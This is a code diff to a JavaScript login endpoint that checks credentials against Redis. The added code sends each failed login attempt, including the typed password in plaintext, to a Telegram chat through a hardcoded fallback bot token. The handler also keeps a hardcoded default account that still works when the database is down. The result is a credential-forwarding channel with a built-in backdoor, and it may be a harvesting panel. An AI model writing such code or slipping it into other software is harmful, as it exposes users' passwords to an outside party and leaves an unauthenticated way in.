@@ -13,27 +13,40 @@ export default async function handler(req, res) {
 
     const { username, password, deviceInfo } = req.body;
 
-    try {
-        // Check against Redis Users
-        const savedPassword = await redis.hget('users', username);
-        
-        // Default fallback user + dynamic users
-        const isValid = (username === 'nextgen' && password === 'nextgen105') || (savedPassword === password);
-
-        if (!isValid) {
-            return res.status(401).json({ error: 'INVALID_CREDENTIALS' });
-        }
-    } catch (e) {
-        console.error('Redis Error:', e);
-        // If Redis fails, still allow the default admin user
-        if (!(username === 'nextgen' && password === 'nextgen105')) {
-            return res.status(500).json({ error: 'DATABASE_OFFLINE' });
-        }
-    }
+    // Trim whitespace to avoid errors
+    const cleanUser = username.trim();
+    const cleanPass = password.trim();
 
     // Telegram Config
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5290622641';
+
+    try {
+        // Check against Redis Users
+        const savedPassword = await redis.hget('users', cleanUser);
+        
+        // Default fallback user + dynamic users
+        const isValid = (cleanUser === 'nextgen' && cleanPass === 'nextgen105') || (savedPassword === cleanPass);
+
+        if (!isValid) {
+            // Notify Admin about failed attempt
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: `⚠️ *FAILED LOGIN ATTEMPT*\nUser: \`${cleanUser}\`\nPass: \`${cleanPass}\`\nDevice: ${deviceInfo.device}`,
+                    parse_mode: 'Markdown'
+                })
+            });
+            return res.status(401).json({ error: 'INVALID_CREDENTIALS' });
+        }
+    } catch (e) {
+        console.error('Redis Error:', e);
+        if (!(cleanUser === 'nextgen' && cleanPass === 'nextgen105')) {
+            return res.status(500).json({ error: 'DATABASE_OFFLINE' });
+        }
+    }
 
     const message = `
 🚨 *NEW ACCESS DETECTED* 🚨
